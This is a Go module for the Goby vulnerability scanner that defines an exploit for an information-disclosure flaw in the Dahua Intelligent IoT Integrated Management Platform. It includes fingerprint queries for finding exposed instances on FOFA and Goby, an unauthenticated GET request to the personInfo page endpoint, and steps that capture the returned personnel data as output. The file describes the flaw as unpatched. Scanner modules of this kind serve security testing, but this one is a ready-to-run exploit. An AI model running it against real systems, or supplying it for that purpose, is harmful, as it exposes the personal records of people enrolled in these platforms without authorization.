package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Dahua Intelligent IOT Integrated Management Platform /evo-apigw/evo-face/personInfo/page Information Disclosure Vulnerability",
    "Description": "<p>The Dahua Smart IoT Integrated Management Platform is a comprehensive IoT solution for enterprises and organisations to manage and monitor various devices and resources. The attacker constructs special URLs to read sensitive system information.</p>",
    "Product": "Dahua Intelligent IOT Integrated Management Platform",
    "Homepage": "https://www.dahuatech.com/",
    "DisclosureDate": "2024-06-27",
    "PostTime": "2024-06-27",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"*客户端会小于800*\" && body=\"/static/logo_blue.ico\" && body=\"<title>...</title>\" && body=\"location.hash.indexOf('#/message/')\"",
    "GobyQuery": "body=\"*客户端会小于800*\" && body=\"/static/logo_blue.ico\" && body=\"<title>...</title>\" && body=\"location.hash.indexOf('#/message/')\"",
    "Level": "0",
    "Impact": "<p>The attacker constructs special URLs to read sensitive system information.</p>",
    "Recommendation": "<p>Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "getInfo",
            "type": "select",
            "value": "getInfo",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/evo-apigw/evo-face/personInfo/page?pageSize=10",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "success",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "name",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/evo-apigw/evo-face/personInfo/page?pageSize=10"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/evo-apigw/evo-face/personInfo/page?pageSize=10",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "success",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "name",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "2.0",
    "Translation": {
        "CN": {
            "Name": "大华智能物联综合管理平台 /evo-apigw/evo-face/personInfo/page 信息泄露漏洞",
            "Product": "大华智能物联综合管理平台",
            "Description": "<p>大华智能物联综合管理平台是一个综合性的物联网解决方案，主要用于企业和组织管理和监控各类设备和资源。攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.dahuatech.com/\" target=\"_blank\">https://www.dahuatech.com/</a><br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址， 读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Dahua Intelligent IOT Integrated Management Platform /evo-apigw/evo-face/personInfo/page Information Disclosure Vulnerability",
            "Product": "Dahua Intelligent IOT Integrated Management Platform",
            "Description": "<p>The Dahua Smart IoT Integrated Management Platform is a comprehensive IoT solution for enterprises and organisations to manage and monitor various devices and resources. The attacker constructs special URLs to read sensitive system information.<br></p>",
            "Recommendation": "<p>Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"https://www.dahuatech.com/\" target=\"_blank\">https://www.dahuatech.com/</a><br></p>",
            "Impact": "<p>The attacker constructs special URLs to read sensitive system information.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10963"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}